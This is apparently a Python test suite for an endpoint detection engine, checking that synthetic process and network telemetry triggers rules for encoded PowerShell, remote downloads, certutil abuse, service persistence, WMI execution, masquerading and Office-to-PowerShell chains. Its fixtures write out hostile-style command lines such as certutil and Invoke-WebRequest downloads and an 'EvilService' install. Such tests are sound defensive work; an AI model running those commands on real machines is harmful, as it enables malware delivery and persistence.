from backend.detection import (
    Detection,
    detect,
    make_condition_key,
    condition_from_detection,
)
import json


PASSED = 0
FAILED = 0


def test(name, condition):
    global PASSED, FAILED

    try:
        assert condition
        print(f"[PASS] {name}")
        PASSED += 1
    except Exception as exc:
        print(f"[FAIL] {name}")
        print(f"       {exc}")
        FAILED += 1


def detections_for(telemetry, rule_id):
    return [
        d for d in detect(telemetry)
        if d.get("rule_id") == rule_id
    ]


# =========================================================
# 1. ENGINE
# =========================================================

import backend.detection as detection_module

test(
    "Detection engine version is 0.8.5",
    detection_module.DETECTION_ENGINE_VERSION == "0.8.5",
)

test(
    "Public detect() exists",
    callable(detect),
)

test(
    "Process-chain detector exists",
    hasattr(detection_module, "detect_process_chain_behavior"),
)


# =========================================================
# 2. EMPTY / MALFORMED TELEMETRY
# =========================================================

test(
    "Empty telemetry returns no crash",
    detect({}) == [],
)

test(
    "Non-dict telemetry returns empty list",
    detect(None) == [],
)

test(
    "Malformed process list is ignored",
    detect({"processes": "not-a-list"}) == [],
)

test(
    "Malformed connection list is ignored",
    detect({"connections": "not-a-list"}) == [],
)


# =========================================================
# 3. PROCESS RESOURCE DETECTION
# =========================================================

resource_test = {
    "processes": [
        {
            "name": "unknown-malware.exe",
            "pid": 100,
            "cpu_percent": 97,
            "memory_percent": 10,
            "exe": r"C:\Users\Test\AppData\Local\Temp\unknown-malware.exe",
            "cmdline": "unknown-malware.exe",
        }
    ]
}

test(
    "High CPU process detection",
    bool(detections_for(resource_test, "PROC-RESOURCE-001")),
)


# =========================================================
# 4. SUSPICIOUS EXECUTION PATH
# =========================================================

path_test = {
    "processes": [
        {
            "name": "evil.exe",
            "pid": 101,
            "cpu_percent": 5,
            "memory_percent": 5,
            "exe": r"C:\Users\Test\AppData\Local\Temp\evil.exe",
            "cmdline": "evil.exe",
        }
    ]
}

test(
    "Suspicious execution path detection",
    bool(detections_for(path_test, "PROC-PATH-001")),
)


# =========================================================
# 5. ENCODED POWERSHELL
# =========================================================

encoded_test = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 102,
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        }
    ]
}

test(
    "Encoded PowerShell detection",
    bool(detections_for(encoded_test, "PROC-CMD-001")),
)


# =========================================================
# 6. DOWNLOAD BEHAVIOR
# =========================================================

download_test = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 103,
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe Invoke-WebRequest https://example.com/file.exe",
        }
    ]
}

download_hits = detect(download_test)

test(
    "Remote download behavior detected",
    bool(
        [
            d for d in download_hits
            if d["rule_id"] in {
                "PROC-CMD-002",
                "PROC-DOWNLOAD-001",
            }
        ]
    ),
)


# =========================================================
# 7. OBFUSCATION
# =========================================================

obfuscation_test = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 104,
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe [Convert]::FromBase64String('SGVsbG9Xb3JsZA==')",
        }
    ]
}

test(
    "Command obfuscation detection",
    bool(detections_for(obfuscation_test, "PROC-OBFUSCATION-001")),
)


# =========================================================
# 8. SERVICE PERSISTENCE
# =========================================================

persistence_test = {
    "processes": [
        {
            "name": "sc.exe",
            "pid": 105,
            "exe": r"C:\Windows\System32\sc.exe",
            "cmdline": "sc.exe create EvilService binPath= C:\\Temp\\evil.exe",
        }
    ]
}

test(
    "Service persistence detection",
    bool(detections_for(persistence_test, "PROC-PERSIST-002")),
)


# =========================================================
# 9. WMI
# =========================================================

wmi_test = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 106,
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "Invoke-WmiMethod -Class Win32_Process",
        }
    ]
}

test(
    "WMI execution detection",
    bool(detections_for(wmi_test, "PROC-WMI-001")),
)


# =========================================================
# 10. PROCESS MASQUERADING
# =========================================================

masquerade_test = {
    "processes": [
        {
            "name": "svchost.exe",
            "pid": 107,
            "exe": r"C:\Users\Test\Downloads\svchost.exe",
            "cmdline": "svchost.exe",
        }
    ]
}

test(
    "Process masquerading detection",
    bool(detections_for(masquerade_test, "PROC-MASQ-001")),
)


# =========================================================
# 11. SUSPICIOUS SCRIPTING INTERPRETER
# =========================================================

interpreter_test = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 108,
            "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "cmdline": "powershell.exe -windowstyle hidden -executionpolicy bypass",
        }
    ]
}

test(
    "Suspicious scripting interpreter detection",
    bool(detections_for(interpreter_test, "PROC-SCRIPT-001")),
)


# =========================================================
# 12. LOLBIN CONTEXT
# =========================================================

lolbin_test = {
    "processes": [
        {
            "name": "certutil.exe",
            "pid": 109,
            "exe": r"C:\Windows\System32\certutil.exe",
            "cmdline": "certutil.exe -urlcache -split https://example.com/a.exe",
        }
    ]
}

test(
    "LOLBin suspicious context detection",
    bool(detections_for(lolbin_test, "PROC-LOLBIN-001")),
)


# =========================================================
# 13. NETWORK SCANNING
# =========================================================

scan_connections = []

for i in range(12):
    scan_connections.append(
        {
            "remote_ip": f"10.10.10.{20 + i}",
            "remote_port": 443,
            "status": "ESTABLISHED",
            "process_name": "scanner.exe",
            "pid": 200 + i,
        }
    )

scan_test = {
    "connections": scan_connections,
    "network_history": {
        "event_count": 5,
        "distinct_remote_ips": {
            "10.10.10.1",
            "10.10.10.2",
        },
        "distinct_destinations": {
            "10.10.10.1:443",
        },
        "distinct_ports": {
            "443",
        },
    },
}

test(
    "Network scan detection",
    bool(detections_for(scan_test, "NET-SCAN-001")),
)


# =========================================================
# 14. EXTERNAL REMOTE ADMIN
# =========================================================

admin_test = {
    "connections": [
        {
            "remote_ip": "8.8.8.8",
            "remote_port": 3389,
            "status": "ESTABLISHED",
            "process_name": "mstsc.exe",
            "pid": 300,
        }
    ]
}

test(
    "External remote administration detection",
    bool(detections_for(admin_test, "NET-EXTERNAL-ADMIN-001")),
)


# =========================================================
# 15. RARE PUBLIC DESTINATION
# =========================================================

rare_test = {
    "connections": [
        {
            "remote_ip": "8.8.8.8",
            "remote_port": 443,
            "status": "ESTABLISHED",
            "process_name": "unknown.exe",
            "pid": 301,
        }
    ],
    "seen_destinations": set(),
}

test(
    "Rare public destination detection",
    bool(detections_for(rare_test, "NET-RARE-DEST-001")),
)


# =========================================================
# 16. SUSPICIOUS PORT
# =========================================================

port_test = {
    "connections": [
        {
            "remote_ip": "8.8.8.8",
            "remote_port": 4444,
            "status": "ESTABLISHED",
            "process_name": "unknown.exe",
            "pid": 302,
        }
    ]
}

test(
    "Suspicious remote port detection",
    bool(detections_for(port_test, "NET-PORT-001")),
)


# =========================================================
# 17. V0.8.5 OFFICE -> POWERSHELL
# =========================================================

office_chain = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 400,
            "ppid": 0,
            "cmdline": "WINWORD.EXE",
        },
        {
            "name": "powershell.exe",
            "pid": 401,
            "ppid": 400,
            "parent_name": "WINWORD.EXE",
            "cmdline": "powershell.exe -NoProfile",
        },
    ]
}

office_hits = detections_for(
    office_chain,
    "PROC-CHAIN-001",
)

test(
    "V0.8.5 WINWORD -> PowerShell chain",
    len(office_hits) == 1,
)

test(
    "Office chain has correct chain_type",
    office_hits[0]["evidence"]["chain_type"]
    == "document_or_mail_to_interpreter",
)

test(
    "Office chain uses MITRE T1059",
    office_hits[0]["mitre_technique_id"] == "T1059",
)


# =========================================================
# 18. BENIGN EXPLORER -> POWERSHELL
# =========================================================

benign_chain = {
    "processes": [
        {
            "name": "explorer.exe",
            "pid": 500,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 501,
            "ppid": 500,
            "parent_name": "explorer.exe",
            "cmdline": "powershell.exe",
        },
    ]
}

test(
    "Benign Explorer -> PowerShell is not chain-detected",
    not detections_for(benign_chain, "PROC-CHAIN-001"),
)


# =========================================================
# 19. POWERSHELL -> LOLBIN
# =========================================================

lolbin_chain = {
    "processes": [
        {
            "name": "powershell.exe",
            "pid": 600,
            "ppid": 0,
            "cmdline": "powershell.exe",
        },
        {
            "name": "certutil.exe",
            "pid": 601,
            "ppid": 600,
            "parent_name": "powershell.exe",
            "cmdline": "certutil.exe",
        },
    ]
}

lolbin_chain_hits = detections_for(
    lolbin_chain,
    "PROC-CHAIN-001",
)

test(
    "V0.8.5 PowerShell -> certutil chain",
    len(lolbin_chain_hits) == 1,
)

test(
    "LOLBin chain has correct chain_type",
    lolbin_chain_hits[0]["evidence"]["chain_type"]
    == "interpreter_to_lolbin",
)

test(
    "LOLBin chain uses MITRE T1218",
    lolbin_chain_hits[0]["mitre_technique_id"] == "T1218",
)


# =========================================================
# 20. PPID-ONLY PARENT RESOLUTION
# =========================================================

ppid_only_chain = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 700,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 701,
            "ppid": 700,
            "cmdline": "powershell.exe",
        },
    ]
}

ppid_hits = detections_for(
    ppid_only_chain,
    "PROC-CHAIN-001",
)

test(
    "PPID-only parent resolution",
    len(ppid_hits) == 1,
)

test(
    "PPID resolution identifies WINWORD",
    ppid_hits[0]["evidence"]["parent_name"] == "winword.exe",
)


# =========================================================
# 21. STABLE SIGNAL IDENTITY
# =========================================================

chain_a = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 800,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 801,
            "ppid": 800,
            "parent_name": "WINWORD.EXE",
        },
    ]
}

chain_b = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 900,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 901,
            "ppid": 900,
            "parent_name": "WINWORD.EXE",
        },
    ]
}

a = detections_for(chain_a, "PROC-CHAIN-001")[0]
b = detections_for(chain_b, "PROC-CHAIN-001")[0]

test(
    "Process-chain signal_key is stable across PIDs",
    a["signal_key"] == b["signal_key"],
)

test(
    "Process-chain fingerprint is stable across PIDs",
    a["fingerprint"] == b["fingerprint"],
)


# =========================================================
# 22. DETECTION DEDUPLICATION
# =========================================================

duplicate_processes = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 1000,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 1001,
            "ppid": 1000,
            "parent_name": "WINWORD.EXE",
        },
        {
            "name": "powershell.exe",
            "pid": 1002,
            "ppid": 1000,
            "parent_name": "WINWORD.EXE",
        },
    ]
}

duplicate_hits = detections_for(
    duplicate_processes,
    "PROC-CHAIN-001",
)

test(
    "Duplicate process-chain findings collapse to one detection",
    len(duplicate_hits) == 1,
)

test(
    "Deduplication records hit_count",
    duplicate_hits[0]["evidence"].get("hit_count") == 2,
)


# =========================================================
# 23. DEVICE CONDITION ISOLATION
# =========================================================

# Use the real Detection object here because condition_from_detection()
# is intentionally an internal structured-object transformation.
chain_detection = Detection(
    rule_id="PROC-CHAIN-001",
    title="Suspicious process execution chain",
    description="Test process-chain detection",
    severity="MEDIUM",
    confidence="MEDIUM",
    category="behaviour",
    risk_increment=14,
    mitre_tactic="Execution",
    mitre_technique="Command and Scripting Interpreter",
    mitre_technique_id="T1059",
    signal_key="process-chain:winword.exe->powershell.exe",
    evidence={
        "parent_name": "winword.exe",
        "parent_pid": 800,
        "child_name": "powershell.exe",
        "child_pid": 801,
        "chain_type": "document_or_mail_to_interpreter",
        "source": "current_process_snapshot",
    },
)

condition_a = make_condition_key(
    chain_detection,
    "DEVICE-A",
)

condition_b = make_condition_key(
    chain_detection,
    "DEVICE-B",
)

test(
    "Same signal on Device A and Device B has different condition keys",
    condition_a != condition_b,
)

test(
    "Device A condition contains DEVICE-A",
    condition_a.startswith("device-a|"),
)

test(
    "Device B condition contains DEVICE-B",
    condition_b.startswith("device-b|"),
)


# =========================================================
# 24. CONDITION CONTRACT
# =========================================================

condition = condition_from_detection(
    chain_detection,
    "DEVICE-A",
)

test(
    "Condition contract has condition_id",
    bool(condition.get("condition_id")),
)

test(
    "Condition contract preserves device_id",
    condition.get("device_id") == "DEVICE-A",
)

test(
    "Condition contract preserves rule_id",
    condition.get("rule_id") == "PROC-CHAIN-001",
)

test(
    "Condition contract preserves signal_key",
    condition.get("signal_key") == chain_detection.signal_key,
)

test(
    "Condition contract preserves severity",
    condition.get("severity") == "MEDIUM",
)

test(
    "Condition contract preserves risk_increment",
    condition.get("risk_increment") == 14,
)

# =========================================================
# 25. MIXED TELEMETRY
# =========================================================

mixed_test = {
    "processes": [
        {
            "name": "WINWORD.EXE",
            "pid": 1100,
            "ppid": 0,
        },
        {
            "name": "powershell.exe",
            "pid": 1101,
            "ppid": 1100,
            "parent_name": "WINWORD.EXE",
            "cmdline": "powershell.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        },
    ],
    "connections": [
        {
            "remote_ip": "8.8.8.8",
            "remote_port": 4444,
            "status": "ESTABLISHED",
            "process_name": "powershell.exe",
            "pid": 1101,
        }
    ],
}

mixed_rules = {
    d["rule_id"]
    for d in detect(mixed_test)
}

test(
    "Mixed process + network telemetry produces multiple signal families",
    "PROC-CHAIN-001" in mixed_rules
    and "PROC-CMD-001" in mixed_rules
    and "NET-PORT-001" in mixed_rules,
)


# =========================================================
# FINAL REPORT
# =========================================================

print()
print("=" * 60)
print("ABACUS SECURITY MONITORING SYSTEM")
print("DETECTION ENGINE v0.8.5 TEST REPORT")
print("=" * 60)
print(f"PASSED : {PASSED}")
print(f"FAILED : {FAILED}")
print(f"TOTAL  : {PASSED + FAILED}")
print("=" * 60)

if FAILED:
    print("STATUS : FAIL")
    raise SystemExit(1)

print("STATUS : PASS")
print("All v0.8.5 detection-engine tests passed.")